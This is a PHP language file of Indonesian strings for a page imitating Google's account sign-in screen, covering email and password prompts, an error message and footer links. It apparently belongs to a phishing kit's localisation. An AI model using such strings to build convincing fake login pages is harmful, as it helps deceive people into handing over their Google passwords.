<?php
/*
------------------
Language: Indonesia
------------------
*/
 
$lang = array();
// Header 
$lang['TITTLE'] = 'Masuk - Akun Google';
$lang['SIGN_IN'] = 'Masuk';
$lang['CONT_GMAIL'] = 'untuk melanjutkan ke Gmail';
$lang['PASSWORD'] = 'Kata sandi';
$lang['EMAIL'] = 'Email atau Telepon';
$lang['NEXT'] = 'Berikutnya';
$lang['SIGN'] = 'Masuk';
$lang['FORGOT'] = 'Lupa kata sandi?';
$lang['ERROR'] = 'nama pengguna dan kata sandi salah';

//Google Log in
$lang['ONE'] = 'Satu akun Semua Google.';
$lang['SIGN_WITH'] = 'Masuk dengan Akun Google Anda';
$lang['STAY'] = 'Tetap masuk';
$lang['KEEP_CHECKED'] = 'Untuk kenyamanan Anda, pastikan ini diperiksa. Pada perangkat bersama, tindakan pencegahan tambahan disarankan.';
$lang['SIGN_DIFFERENT'] = 'Masuk dengan akun lain';
$lang['EVERYTHING'] = 'Satu Akun Google untuk semuanya Google';
$lang['ABOUT'] = 'Tentang Google';
$lang['PRIVACY'] = 'Pribadi';
$lang['TERM'] = 'Ketentuan';
$lang['HELP'] = 'Bantuan';
$lang['FIND_ACCOUNT'] = 'Temukan Akun Saya';
$lang['CREATE'] = 'Buat Akun';
?>